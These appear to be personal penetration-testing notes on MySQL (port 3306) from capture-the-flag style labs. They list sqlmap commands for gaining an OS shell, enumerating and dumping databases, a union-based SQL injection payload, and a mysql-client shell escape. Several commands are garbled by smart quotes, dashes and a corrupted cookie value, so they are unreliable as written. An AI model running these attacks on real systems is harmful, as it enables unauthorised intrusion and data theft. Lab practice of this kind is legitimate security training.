# Port 3306/tcp
## Stardard usage
 - MySQL
<hr>
10.129.228.56k
### Automatic tools for sql injection
#### sqlmap
-  for http endpoint api query
-  Usage:
   -  Reverse shell
    ```bash
    sqlmap -u http://10.129.207.176/dashboard.php\?search\= --cookie="PHPSESSID=vkrvi768lbi9USE mysql;l638e7n8ovv03e" --os-shell
    ```
   -  Init scanning db
    ```bash
    sqlmap ${curl_param}
    # Example
    sqlmap ‘http://preprod-payroll.trick.htb/ajax.php?action=login’ -H ‘User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0’ -H ‘Accept: */*’ -H ‘Accept-Language: en-US,en;q=0.5’ –compressed -H ‘Content-Type: application/x-www-form-urlencoded; charset=UTF-8’ -H ‘X-Requested-With: XMLHttpRequest’ -H ‘Origin: http://preprod-payroll.trick.htb’ -H ‘Connection: keep-alive’ -H ‘Referer: http://preprod-payroll.trick.htb/login.php’ -H ‘Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5’ –data-raw ‘username=admin&password=admin’
    ```
    - Enumerating for the databases
    ```bash
    sqlmap ${curl_param} --dbs
    # Example
    sqlmap ‘http://preprod-payroll.trick.htb/ajax.php?action=login’ -H ‘User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0’ -H ‘Accept: */*’ -H ‘Accept-Language: en-US,en;q=0.5’ –compressed -H ‘Content-Type: application/x-www-form-urlencoded; charset=UTF-8’ -H ‘X-Requested-With: XMLHttpRequest’ -H ‘Origin: http://preprod-payroll.trick.htb’ -H ‘Connection: keep-alive’ -H ‘Referer: http://preprod-payroll.trick.htb/login.php’ -H ‘Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5’ –data-raw ‘username=admin&password=admin’ –dbs
    ```
    - Get tables from a db
    ```bash
    sqlmap ${curl_param} -D db_name –tables
    ```
    - Dump a tables
    ```bash
    sqlmap ${curl_param} -D db_name -T tb_name –dump
    ```

    - Combine usage with burp
        - Copy repeater request as req.map
        ```bash
        sqlmap -r sql.map -p total_service --batch
        ```
### SQL inject query
- Resource: https://book.hacktricks.xyz/pentesting-web/sql-injection
- Union-basd
    ```sql
    "test' and 1=2 UNION SELECT 1,sqlite_version(),3 -- -
    ```

### Shell in msql
```bash
\! sh
```
